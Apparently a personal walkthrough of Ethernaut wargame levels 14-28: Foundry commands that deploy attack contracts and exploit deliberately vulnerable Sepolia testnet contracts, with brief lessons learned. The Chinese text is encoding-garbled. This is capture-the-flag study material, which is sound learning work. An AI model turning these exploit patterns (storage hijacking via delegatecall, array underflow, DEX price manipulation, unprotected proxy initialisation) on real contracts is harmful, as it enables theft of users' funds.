æ¨¡ç‰ˆ:Level 27: Forta - Foundry æ”»å‡»æ­¥éª¤
ğŸ¯ ç›®æ ‡
ğŸ“‹ æ”»å‡»æ­¥éª¤
ğŸ§ª å®Œæ•´è‡ªåŠ¨åŒ–è„šæœ¬ï¼ˆå¯é€‰ï¼‰
ğŸ“ å­¦åˆ°çš„çŸ¥è¯†
ä¸€å¥è¯æ€»ç»“

forge create src/14-GatekeeperOneAttack/GatekeeperOneAttack.sol:GatekeeperOneAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $Elevator_ADDRESS




14-GatekeeperOne/AttackGateKeeperOne.sol
```
forge create src/14-GatekeeperOne/AttackGateKeeperOne.sol:GatekeeperOneAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast     \
    --constructor-args $GatekeeperOne_ADDRESS
Deployed to: 0x7af2b50a036852d8C51cFED3250F26CfD76066E8

attack:
cast call $GatekeeperOne_ADDRESS "entrant()" --rpc-url $sepolia_rpc
cast send 0x7af2b50a036852d8C51cFED3250F26CfD76066E8 \
--rpc-url $sepolia_rpc \
 --private-key $PRIVATE_KEY \
 --gas-limit 3000000
```

15-GatekeeperTwoAttack
```

forge create src/15-GatekeeperTwo/GatekeeperTwoAttack.sol:GatekeeperTwoAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast     \
    --constructor-args $GatekeeperTwo_ADDRESS \
    -vvvv
Deployed to: 0x5B62f395D0BAe18cFf09E90D9C174B2a38E07e75

cast call $GatekeeperTwo_ADDRESS "entrant()" --rpc-url $sepolia_rpc
```

# 16-NaughtCoin
```
# 1. æŸ¥çœ‹ä½™é¢
cast call $NaughtCoin_ADDRESS "balanceOf(address)" $YOUR_ADDRESS --rpc-url $sepolia_rpc

# 2. æˆæƒ
cast send $NaughtCoin_ADDRESS "approve(address,uint256)" $YOUR_ADDRESS $(cast call $NaughtCoin_ADDRESS "balanceOf(address)" $YOUR_ADDRESS --rpc-url $sepolia_rpc) \
  --rpc-url $sepolia_rpc \
  --private-key $PRIVATE_KEY

# 3. ä½¿ç”¨ transferFrom è½¬èµ°
cast send $NaughtCoin_ADDRESS "transferFrom(address,address,uint256)" $YOUR_ADDRESS $ANOTHER_ADDRESS $(cast call $NaughtCoin_ADDRESS "balanceOf(address)" $YOUR_ADDRESS --rpc-url $sepolia_rpc) \
  --rpc-url $sepolia_rpc \
  --private-key $PRIVATE_KEY
```
### è€ƒå¯Ÿç‚¹:
- æ„é€ å‡½æ•°è¯­æ³•ï¼šERC20("NaughtCoin", "0x0") æ˜¯è°ƒç”¨çˆ¶åˆçº¦æ„é€ å‡½æ•°
- æ¼æ´æ ¹æºï¼šERC20 æœ‰ä¸¤ä¸ªè½¬è´¦å…¥å£ï¼Œåªé™åˆ¶äº†ä¸€ä¸ª
- ä»¥å¤ªåŠåŸå› ï¼šç»§æ‰¿æœºåˆ¶å¯¼è‡´æœªé‡å†™çš„å‡½æ•°ä½¿ç”¨çˆ¶åˆçº¦å®ç°
- æ•™è®­ï¼šé‡å†™å‡½æ•°æ—¶è¦è€ƒè™‘æ‰€æœ‰å…¥å£ç‚¹ï¼Œæˆ–é‡å†™å†…éƒ¨å‡½æ•°

# 17-Preservation
```
# 1. éƒ¨ç½²æ”»å‡»åˆçº¦
forge create src/17-Preservation/PreservationAttack.sol:PreservationAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast
=> Deployed to: 0xA913BB312e3b6A7E21bc6Af3Da388fC585EbFc69
# 2. æŸ¥çœ‹å½“å‰ owner
cast call $Preservation_ADDRESS "owner()" --rpc-url $sepolia_rpc
# 3. ç¬¬ä¸€æ¬¡æ”»å‡»ï¼šæ›¿æ¢ library åœ°å€
cast send $Preservation_ADDRESS "setFirstTime(uint256)" \
    0x000000000000000000000000a913bb312e3b6a7e21bc6af3da388fc585ebfc69 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
# 4. éªŒè¯ timeZone1Library æ˜¯å¦è¢«æ›¿æ¢
cast call $Preservation_ADDRESS "timeZone1Library()" --rpc-url $sepolia_rpc
# 5. ç¬¬äºŒæ¬¡æ”»å‡»ï¼šä¿®æ”¹ owner
cast send $Preservation_ADDRESS "setFirstTime(uint256)" \
    0x0000000000000000000000004a2578679c9a9901844380c7340e074045e75853 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
```

### è€ƒå¯Ÿç‚¹
- 1. delegatecall çš„å±é™©æ€§
åœ¨è°ƒç”¨è€…ä¸Šä¸‹æ–‡æ‰§è¡Œä»£ç 
å­˜å‚¨æ§½ä½ç½®ç”±è¢«è°ƒç”¨åˆçº¦å†³å®š
å¦‚æœå¸ƒå±€ä¸ä¸€è‡´ï¼Œä¼šè¦†ç›–é”™è¯¯çš„å˜é‡
- 2. æ²¡æœ‰éªŒè¯ library åœ°å€
å…è®¸ç”¨æˆ·é€šè¿‡ delegatecall ä¿®æ”¹ library åœ°å€
æ²¡æœ‰è®¿é—®æ§åˆ¶


# 18-Recovery
```
# æ­¥éª¤ 1: è®¡ç®— SimpleToken åˆçº¦åœ°å€ //nonceä¸ä¸€å®šä¸º1 å¯ä»¥ç»“åˆåŒºå—æµè§ˆå™¨ç¡®è®¤æˆ–è€…ç¼–ç¨‹è·å–åœ°å€
SIMPLE_TOKEN=$(cast compute-address --nonce 1 $Recovery_ADDRESS)
//0x59b73c1025C305Ed13bD0ed2Ce755e9859c3991d
echo "SimpleToken address: $SIMPLE_TOKEN"
# æ­¥éª¤ 2: éªŒè¯åˆçº¦ç¡®å®å­˜åœ¨
cast code $SIMPLE_TOKEN --rpc-url $sepolia_rpc
# æ­¥éª¤ 3: æ£€æŸ¥åˆçº¦ä½™é¢
cast balance $SIMPLE_TOKEN --rpc-url $sepolia_rpc
# æ­¥éª¤ 4: è°ƒç”¨ destroy å‡½æ•°ï¼Œå°† ETH è½¬åˆ°ä½ çš„åœ°å€
cast send $SIMPLE_TOKEN "destroy(address)" $YOUR_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
```

### è€ƒå¯Ÿç‚¹ï¼š
- åˆçº¦åœ°å€çš„ç¡®å®šæ€§è®¡ç®—
- RLP ç¼–ç ç†è§£
- åŒºå—é“¾æµè§ˆå™¨çš„ä½¿ç”¨
- CREATE vs CREATE2
- selfdestruct çš„ä½¿ç”¨

# 19-MagicNum
```
æ„é€ ä¸€ä¸ªç¼–è¯‘å™¨åˆçº¦:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SolverDeployer {
    function deploy() public returns (address) {
        bytes memory bytecode = hex"600a600c600039600a6000f3602a60005260206000f3";
        address solver;
        
        assembly {
            solver := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        
        return solver;
    }
}
# 1. éƒ¨ç½² SolverDeployer //å…¶å®è¿™ä¸€æ­¥ åŒæ—¶åˆ›å»ºäº†ä¸¤ä¸ªåˆçº¦
forge create src/19-MagicNum/SolverDeployer.sol:SolverDeployer \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast
Deployed to: 0xCcbc18F6978FFD0211377851fBB3cEAdc0A9998b

# 2. è°ƒç”¨ deploy() åˆ›å»º solver åˆçº¦
cast send --rpc-url $sepolia_rpc --private-key $PRIVATE_KEY $SolverDeployer_ADDRESS 
=>tx: 0xee91ec904447236c48a3831415960a344f0dce868e9519e2e2b8c6e73697d542
è®¡ç®—åœ°å€:0xf86983085f15DC9b6CB14e84E1d26E7EE8282a2F
SOLVER=$(cast compute-address --nonce 1 0xCcbc18F6978FFD0211377851fBB3cEAdc0A9998b)
æˆ–è€…ä½¿ç”¨cast run fork:
luckyme@macdeMacBook-Pro ethernaut % cast run 0xee91ec904447236c48a3831415960a344f0dce868e9519e2e2b8c6e73697d542 \
    --rpc-url $sepolia_rpc
Executing previous transactions from the block.
Traces:
  [34475] 0xCcbc18F6978FFD0211377851fBB3cEAdc0A9998b::deploy()
    â”œâ”€ [2024] â†’ new <unknown>@0xf86983085f15DC9b6CB14e84E1d26E7EE8282a2F
    â”‚   â””â”€ â† [Return] 10 bytes of code
    â””â”€ â† [Return] 0x000000000000000000000000f86983085f15dc9b6cb14e84e1d26e7ee8282a2f


Transaction successfully executed.
Gas used: 55539
=> SOLVER_Address=0xf86983085f15DC9b6CB14e84E1d26E7EE8282a2F

# 3. æµ‹è¯•
cast call $SOLVER_Address "whatIsTheMeaningOfLife()" --rpc-url $sepolia_rpc

# 4. è®¾ç½®åˆ° MagicNum
cast send $MagicNum_ADDRESS "setSolver(address)" $SOLVER_Address \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

```

### è€ƒå¯ŸçŸ¥è¯†ç‚¹
- ç¼–è¯‘åçš„å­—èŠ‚ç ä¼šæœ‰å‡ ç™¾å­—èŠ‚ï¼Œè¿œè¶… 10 å­—èŠ‚é™åˆ¶éœ€è¦æ‰‹å†™EVM å­—èŠ‚ç ç¼©å°codesize.
- äº†è§£è¿è¡Œæ—¶ä»£ç  (runtime code)
```
// è¿è¡Œæ—¶ä»£ç ï¼ˆ10 å­—èŠ‚ï¼‰
602a    // PUSH1 0x2a (å°† 42 æ¨å…¥æ ˆ)
6000    // PUSH1 0x00 (å†…å­˜ä½ç½® 0)
52      // MSTORE (å°† 42 å­˜å‚¨åˆ°å†…å­˜ä½ç½® 0)
6020    // PUSH1 0x20 (è¿”å›æ•°æ®é•¿åº¦ 32 å­—èŠ‚)
6000    // PUSH1 0x00 (å†…å­˜ä½ç½® 0)
f3      // RETURN (è¿”å›å†…å­˜ä¸­çš„æ•°æ®)

// æ€»å…±ï¼š10 å­—èŠ‚ âœ“
```
- äº†è§£åˆ›å»ºä»£ç  (creation code)  è´Ÿè´£å°†è¿è¡Œæ—¶ä»£ç å¤åˆ¶åˆ°å†…å­˜,è¿”å›è¿è¡Œæ—¶ä»£ç 
```
// åˆ›å»ºä»£ç 
600a    // PUSH1 0x0a (è¿è¡Œæ—¶ä»£ç é•¿åº¦ = 10 å­—èŠ‚)
600c    // PUSH1 0x0c (è¿è¡Œæ—¶ä»£ç åœ¨åˆ›å»ºä»£ç ä¸­çš„èµ·å§‹ä½ç½®)
6000    // PUSH1 0x00 (å†…å­˜ç›®æ ‡ä½ç½®)
39      // CODECOPY (å¤åˆ¶ä»£ç åˆ°å†…å­˜)
600a    // PUSH1 0x0a (è¿”å›æ•°æ®é•¿åº¦ = 10 å­—èŠ‚)
6000    // PUSH1 0x00 (å†…å­˜ä½ç½®)
f3      // RETURN (è¿”å›è¿è¡Œæ—¶ä»£ç )

// è¿è¡Œæ—¶ä»£ç ï¼ˆç´§è·Ÿåœ¨åˆ›å»ºä»£ç åé¢ï¼‰
602a60005260206000f3

// å®Œæ•´å­—èŠ‚ç ï¼š
// åˆ›å»ºä»£ç ï¼š600a600c600039600a6000f3
// è¿è¡Œæ—¶ä»£ç ï¼š602a60005260206000f3
```
- å®Œæ•´åå…­è¿›åˆ¶ï¼š0x600a600c600039600a6000f3602a60005260206000f3 (ä¹Ÿå«åŸå§‹å­—èŠ‚ç ,åŒ…å«äº†åˆ›å»ºä»£ç ä»¥åŠè¿è¡Œæ—¶ä»£ç )

### å½©è›‹
Awesome work! Youâ€™re halfway through Ethernaut and getting pretty good at breaking things. Working as a Blockchain Security Researcher at OpenZeppelin could be fun... https://grnh.se/fdbf1c043us



# 20-AlienCodex
```
# æ­¥éª¤ 1: makeContactï¼ˆè®¾ç½® contact = trueï¼‰
cast send $AlienCodex_ADDRESS "makeContact()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
-> cast storage $AlienCodex_ADDRESS 0 --rpc-url $sepolia_rpc
-> è·å–slot0çš„æ•°æ® 
0bc04aa6aac163a6b3667636d798fa053d43bd11 è¿™æ˜¯owner 
01 è¿™ä¸ªä»£è¡¨bool public contact;æ­¤æ—¶contact=0x01 (true)
0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11
æŸ¥çœ‹æ­¤æ—¶çš„slot1 cast storage $AlienCodex_ADDRESS 1 --rpc-url $sepolia_rpc
-> 0x0000000000000000000000000000000000000000000000000000000000000000
æ­¥éª¤ 2: è§¦å‘ä¸‹æº¢
# retract() - æ•°ç»„é•¿åº¦ä¸‹æº¢
cast send $AlienCodex_ADDRESS "retract()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
æ­¤æ—¶å†æŸ¥çœ‹ slot1 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff

æ­¥éª¤ 3: è®¡ç®—æ”»å‡»ç´¢å¼• i=2^256 - keccak256(1) æ­¤æ—¶åˆšå¥½ codex[i] å›åˆ°äº† slot1çš„
INDEX=0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a

# 5. æ‰§è¡Œæ”»å‡»
cast send $AlienCodex_ADDRESS "revise(uint256,bytes32)" 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a 0x0000000000000000000000004a2578679c9a9901844380c7340e074045e75853 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
```

### è€ƒå¯Ÿç‚¹
- éœ€è¦ç†Ÿæ‚‰evmä¸­çš„åŠ¨æ€æ•°ç»„å­˜å‚¨æœºåˆ¶


# 21-Denial
```
# 1. éƒ¨ç½²æ”»å‡»åˆçº¦
forge create src/21-Denial/DenialAttack.sol:DenialAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast
Deployed to: 0xef1D7369465f0c3Aa2d02b62294f70072c5374a4

# 2. è®¾ç½®ä¸º partner
cast send $Denial_ADDRESS "setWithdrawPartner(address)" $DenialAttack_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
cast send $Denial_ADDRESS "partner()"  --rpc-url $sepolia_rpc --private-key $PRIVATE_KEY

# 3. æ£€æŸ¥åˆçº¦ä½™é¢ï¼ˆåº”è¯¥ > 0ï¼‰
cast call $Denial_ADDRESS "contractBalance()" --rpc-url $sepolia_rpc

# 4. å°è¯• withdrawï¼ˆåº”è¯¥å¤±è´¥ï¼‰
cast send $Denial_ADDRESS "withdraw()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --gas-limit 900000  \
    -vvvv
```

### è€ƒå¯Ÿç‚¹ 
- callä¼šè½¬å‘æ‰€æœ‰å‰©ä½™gas,ä¸é™åˆ¶è¢«è°ƒç”¨åˆçº¦çš„gasä½¿ç”¨
- transferå›ºå®šæä¾›2300gas,å¦‚æœå½“å‰å‰©ä½™gas<2300+overhead å°±ä¼šrevert
EIP-150 è§„åˆ™ï¼šcall è‡³å°‘ä¿ç•™ 1/64 çš„ gas ç»™è°ƒç”¨è€…,è½¬å‘æœ€å¤š 63/64 çš„ gas
å¦‚æœæ‚¨ä½¿ç”¨ä½çº§åˆ«è°ƒç”¨ä»¥åœ¨å¤–éƒ¨è°ƒç”¨æ¢å¤çš„æƒ…å†µä¸‹ç»§ç»­æ‰§è¡Œï¼Œè¯·ç¡®ä¿æ‚¨æŒ‡å®šå›ºå®šçš„gasè´¹ç”¨ã€‚


# 22-Shop
```
1. éƒ¨ç½²æ”»å‡»åˆçº¦
forge create src/22-Shop/ShopAttack.sol:ShopAttack \
  --rpc-url $sepolia_rpc \
  --private-key $PRIVATE_KEY \
  --broadcast \
  --constructor-args $Shop_ADDRESS
Deployed to: 0x55DE24a1E7B826DD1614b3B968E7E26D929c5529
2. éªŒè¯åˆå§‹çŠ¶æ€
# æ£€æŸ¥åˆå§‹ä»·æ ¼
cast call $Shop_ADDRESS "price()" --rpc-url $sepolia_rpc
# è¾“å‡º: 100 (0x64)
# æ£€æŸ¥æ˜¯å¦å·²å”®å‡º
cast call $Shop_ADDRESS "isSold()" --rpc-url $sepolia_rpc
# è¾“å‡º: false (0x00)
3. æ‰§è¡Œæ”»å‡»
cast send $ShopAttack_ADDRESS "attack()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    -vv
4. éªŒè¯ç»“æœ
# æ£€æŸ¥æœ€ç»ˆä»·æ ¼
cast call $Shop_ADDRESS "price()" --rpc-url $sepolia_rpc
# è¾“å‡º: 0 (0x00) âœ“
```
### è€ƒå¯Ÿç‚¹
- çŠ¶æ€ä¾èµ–
- view å‡½æ•°ä¸èƒ½ä¿®æ”¹è‡ªå·±åˆçº¦çš„çŠ¶æ€,ä½†å¯ä»¥è¯»å–å…¶ä»–åˆçº¦çš„çŠ¶æ€
- å¦‚æœå…¶ä»–åˆçº¦çš„çŠ¶æ€æ”¹å˜ï¼Œviewå‡½æ•°çš„è¿”å›å€¼ä¹Ÿå¯ä»¥éšä¹‹å˜åŒ–


# 23-Dex
```
# 1. æŸ¥çœ‹åˆå§‹çŠ¶æ€
export TOKEN1=0xb04a01b9cf19192d393a85300bbcba0b126a18ab
export TOKEN2=0x21d1be3af432384865df27b8efbe15473b9325e2
cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN1 $Dex_ADDRESS --rpc-url $sepolia_rpc
cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN2 $Dex_ADDRESS --rpc-url $sepolia_rpc
cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN1 $YOUR_ADDRESS --rpc-url $sepolia_rpc
cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN2 $YOUR_ADDRESS --rpc-url $sepolia_rpc
====>
0x0000000000000000000000000000000000000000000000000000000000000064
0x0000000000000000000000000000000000000000000000000000000000000064
0x000000000000000000000000000000000000000000000000000000000000000a  
0x000000000000000000000000000000000000000000000000000000000000000a

# 2. æˆæƒ //ç”¨æˆ·æˆæƒdexåˆçº¦ä½¿ç”¨æœ€å¤§æ•°é‡çš„token1å’Œtoken2
cast send $Dex_ADDRESS "approve(address,uint256)" $Dex_ADDRESS $(cast max-uint) \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 3. Round 1: token1 â†’ token2
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN1 $TOKEN2 10 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 4. Round 2: token2 â†’ token1
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN2 $TOKEN1 20 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 5. Round 3: token1 â†’ token2
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN1 $TOKEN2 24 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN2 $TOKEN1 30 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN1 $TOKEN2 41 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN2 $TOKEN1 45 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
====>token1è¢«å…¨éƒ¨å…‘æ¢å‡ºæ¥
cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN1 $Dex_ADDRESS --rpc-url $sepolia_rpc
0x0000000000000000000000000000000000000000000000000000000000000000
```

### è€ƒå¯Ÿç‚¹
- ä»·æ ¼è®¡ç®—å…¬å¼æœ¬èº«æœ‰ç¼ºé™·,å¯ä»¥é€šè¿‡åå¤äº¤æ˜“å¥—åˆ©

# 24-DexTwo
```
# 1. éƒ¨ç½²æ”»å‡»åˆçº¦ï¼ˆä¼šè‡ªåŠ¨åˆ›å»º FakeTokenï¼‰
forge create src/24-DexTwo/DexTwoAttackAuto.sol:DexTwoAttackAuto \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
====>
Deployed to: 0x62796C20c3c6417389F3C9D10edfadbFA0B74C24

export dex2ATTACK_ADDRESS=0x62796C20c3c6417389F3C9D10edfadbFA0B74C24
export DexTwo_ADDRESS=0x450c4274FE01e7CC8eC09740Dbac2c52C68d4813
# 2. æ‰§è¡Œæ”»å‡»
cast send $dex2ATTACK_ADDRESS "attack(address)" $DexTwo_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    -vv
```

### è€ƒå¯Ÿç‚¹ 
- æ²¡æœ‰éªŒè¯tokenç™½åå•
- ä½¿ç”¨ balanceOf ä½œä¸ºå®šä»·ä¾æ®:


# 25-PuzzleWallet
```
# éƒ¨ç½²æ”»å‡»åˆçº¦
echo -e "\n=== éƒ¨ç½²æ”»å‡»åˆçº¦ ==="
forge create src/25-PuzzleWallet/PuzzleWalletAttack.sol:PuzzleWalletAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $PuzzleWallet_ADDRESS 
Deployed to: 0x8938223232ED7474b03EcBBE90Acf13AfFA3Bc1c
export ATTACK_ADDRESS=0x8938223232ED7474b03EcBBE90Acf13AfFA3Bc1c
æ‰§è¡Œæ”»å‡»
cast send $ATTACK_ADDRESS "attack()" \
    --value 0.001ether \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --gas-limit 500000
```

### è€ƒå¯Ÿç‚¹
- ç†è§£ä»£ç†åˆçº¦å’Œé€»è¾‘åˆçº¦çš„å…±äº«å­˜å‚¨æœºåˆ¶
- é€»è¾‘åˆçº¦åªæ˜¯ä»£ç åº“ æ²¡æœ‰å®é™…å­˜å‚¨,åªæä¾›ä»£ç ï¼Œä¸å­˜å‚¨æ•°æ®,storageæ˜¯ç©ºçš„
- muticallçš„åµŒå¥—è°ƒç”¨  ä¼šäº§ç”Ÿæ–°çš„å±€éƒ¨å‡½æ•°å†…å±€éƒ¨å˜é‡ å¯¼è‡´é‡å…¥
```
å¤–å±‚ multicall([deposit(), multicall([deposit()])])
  â”‚
  â”œâ”€ depositCalled = false  // â† å¤–å±‚çš„å±€éƒ¨å˜é‡
  â”‚
  â”œâ”€ i = 0: deposit()
  â”‚  â”œâ”€ selector = deposit.selector âœ“
  â”‚  â”œâ”€ require(!depositCalled) âœ“ (false, é€šè¿‡)
  â”‚  â”œâ”€ depositCalled = true  // å¤–å±‚æ ‡è®°ä¸º true
  â”‚  â””â”€ delegatecall(deposit())
  â”‚     â””â”€ balances[msg.sender] += 0.001
  â”‚
  â””â”€ i = 1: multicall([deposit()])
     â”œâ”€ selector = multicall.selector  // ä¸æ˜¯ deposit âœ“
     â”œâ”€ if æ¡ä»¶ä¸æ»¡è¶³ï¼Œè·³è¿‡æ£€æŸ¥
     â”‚
     â””â”€ delegatecall(multicall([deposit()]))  â† åµŒå¥—è°ƒç”¨ï¼
        â”‚
        â”‚ å†…å±‚ multicall([deposit()])
        â”œâ”€ depositCalled = false  // â† æ–°çš„å±€éƒ¨å˜é‡ï¼
        â”‚
        â””â”€ i = 0: deposit()
           â”œâ”€ selector = deposit.selector âœ“
           â”œâ”€ require(!depositCalled) âœ“ (false, é€šè¿‡ï¼)
           â”œâ”€ depositCalled = true
           â””â”€ delegatecall(deposit())
              â””â”€ balances[msg.sender] += 0.001
```


# 26-Motorbike
```
// å‡çº§åˆ° Destroyer åˆçº¦
Engine(engine).upgradeToAndCall(
    destroyerAddress,
    abi.encodeWithSignature("destroy()")
);

// æ‰§è¡Œæµç¨‹ï¼š
// 1. _setImplementation(destroyer)  â† Engine çš„ implementation å˜æˆ Destroyer
// 2. delegatecall(destroy())        â† åœ¨ Engine çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œ
//    â””â”€ selfdestruct                â† Engine åˆçº¦è¢«é”€æ¯ï¼

# 1. è·å– Engine åœ°å€ Motorbike_ADDRESS
$(cast storage $Motorbike_ADDRESS $IMPLEMENTATION_SLOT --rpc-url $sepolia_rpc)
ENGINE_ADDRESS=0x0107f010eaed9c32182feed33d945211c17508c4

# 2. æ£€æŸ¥ Engine çš„ upgrader
cast call $ENGINE_ADDRESS "upgrader()" --rpc-url $sepolia_rpc
0x0000000000000000000000000000000000000000000000000000000000000000 //Engine æœªåˆå§‹åŒ–ï¼Œå¯ä»¥æ”»å‡»

# 3. éƒ¨ç½²æ”»å‡»åˆçº¦
echo -e "\n=== Step 3: éƒ¨ç½²æ”»å‡»åˆçº¦ ==="
forge create src/26-Motorbike/MotorbikeAttack.sol:MotorbikeAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $Motorbike_ADDRESS 
Deployed to: 0xF6c10d90a75F49135B900C366b18D953F88a5aD0
export ATTACK_ADDRESS=0xF6c10d90a75F49135B900C366b18D953F88a5aD0

# 4. æ‰§è¡Œæ”»å‡»
cast send $ATTACK_ADDRESS "attack(address)" $ENGINE_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

//ä½¿ç”¨eip-7702 åœ¨åŒä¸€ç¬”äº¤æ˜“ä¸­åˆ›å»ºå’Œè‡ªæ¯engineåˆçº¦:
https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/blob/main/contracts/MotorbikeInterface.sol
export YOUR_ADDRESSZ=0x4A2578679C9a9901844380C7340e074045e75853
export PRIVATE_KEY=0xä½ çš„ç§é’¥
export MOTORBIKE_INSTANCE=0xMotorbikeå®ä¾‹åœ°å€
export sepolia_rpc=ä½ çš„RPC_URL
```

### è€ƒå¯Ÿç‚¹
- è€ƒå¯Ÿçš„æ˜¯UUPSä»£ç†æ¨¡å¼çš„åˆå§‹åŒ–æ¼æ´
- å¯¹selfdestroyçš„ç†è§£ åªæœ‰åœ¨åŒä¸€ç¬”äº¤æ˜“ä¸­åˆ›å»ºå¹¶é”€æ¯æ‰ä¼šåˆ é™¤ä»£ç ,å¦åˆ™åªæ˜¯å°†ä½™é¢è½¬èµ°(EIP-6780 è§„åˆ™)


# 27-DoubleEntryPoint
```
# 1. è·å–åˆçº¦åœ°å€ï¼ˆä»æ–°å®ä¾‹ï¼‰
export NEW_INSTANCE=0xB7ED48d71A303cdF8bcFc659E02fF9bE92df3c9B  # DET å®ä¾‹åœ°å€
export FORTA_ADDRESS=$(cast call $NEW_INSTANCE "forta()(address)" --rpc-url $sepolia_rpc)
export VAULT_ADDRESS=$(cast call $NEW_INSTANCE "cryptoVault()(address)" --rpc-url $sepolia_rpc)
export LEGACY_TOKEN=$(cast call $NEW_INSTANCE "delegatedFrom()(address)" --rpc-url $sepolia_rpc)
export DET_ADDRESS=$NEW_INSTANCE

# 2. éƒ¨ç½²æ£€æµ‹æœºå™¨äººï¼ˆä¼ å…¥ Vault åœ°å€ï¼‰
forge create src/27-Forta/FortaDetectionBot.sol:FortaDetectionBot \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $VAULT_ADDRESS
# Deployed to: 0x8Dca7d1b9C97b8cD93950aaBc0A38318C9FBa964
export BOT_ADDRESS=<éƒ¨ç½²åœ°å€>

# 3. æ³¨å†Œæ£€æµ‹æœºå™¨äººåˆ° Forta
cast send $FORTA_ADDRESS "setDetectionBot(address)" $BOT_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 4. éªŒè¯æ³¨å†ŒæˆåŠŸ
cast call $FORTA_ADDRESS "usersDetectionBots(address)(address)" $YOUR_ADDRESS --rpc-url $sepolia_rpc

# 5. æµ‹è¯•é˜²å¾¡ï¼ˆåº”è¯¥è¢«é˜»æ­¢å¹¶ revertï¼‰
cast send $VAULT_ADDRESS "sweepToken(address)" $LEGACY_TOKEN \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --gas-limit 500000 \
    -vv
# é¢„æœŸç»“æœ: revert "Alert has been triggered, reverting"

# æ‰§è¡Œé“¾è·¯
vault.sweepToken(LegacyToken)
  â†’ LegacyToken.transfer()
    â†’ DET.delegateTransfer(to, value, vault)  â† origSender = vault
      â†’ fortaNotify modifier
        â†’ forta.notify(player, msg.data)
          â†’ detectionBot.handleTransaction(player, msgData)
            â”œâ”€ ä» msgData ä¸­æå– origSender (ä½¿ç”¨ msgData.offset + 0x44)
            â”œâ”€ æ£€æµ‹åˆ° origSender == cryptoVault
            â””â”€ forta.raiseAlert(player)  âœ… è§¦å‘è­¦æŠ¥
      â†’ æ£€æŸ¥ botRaisedAlerts å¢åŠ 
      â†’ revert("Alert has been triggered, reverting")
```

### è€ƒå¯Ÿç‚¹
- **åŒé‡å…¥å£æ¼æ´**ï¼šä»£å¸å§”æ‰˜å‡çº§æœºåˆ¶ä¸­ï¼Œæ—§ä»£å¸ï¼ˆLGTï¼‰å§”æ‰˜ç»™æ–°ä»£å¸ï¼ˆDETï¼‰ï¼Œå¦‚æœ Vault æ¸…ç† LGTï¼Œå®é™…ä¼šè½¬èµ° DET
- **Calldata è§£æ**ï¼šç†è§£ `bytes calldata` å‚æ•°çš„å†…å­˜å¸ƒå±€ï¼Œä½¿ç”¨ `msgData.offset` æ­£ç¡®è¯»å–å‚æ•°
- **Assembly æ•°æ®è¯»å–**ï¼š`calldataload(add(msgData.offset, 0x44))` è¯»å–ç¬¬ä¸‰ä¸ªå‚æ•° `origSender`
- **é˜²å¾¡æœºåˆ¶**ï¼šé€šè¿‡æ£€æµ‹ `origSender == vault` æ¥é˜²å¾¡åŒé‡å…¥å£æ”»å‡»ï¼Œåœ¨ `fortaNotify` ä¿®é¥°ç¬¦ä¸­è§¦å‘ revert

# 28-GoodSamaritan
```
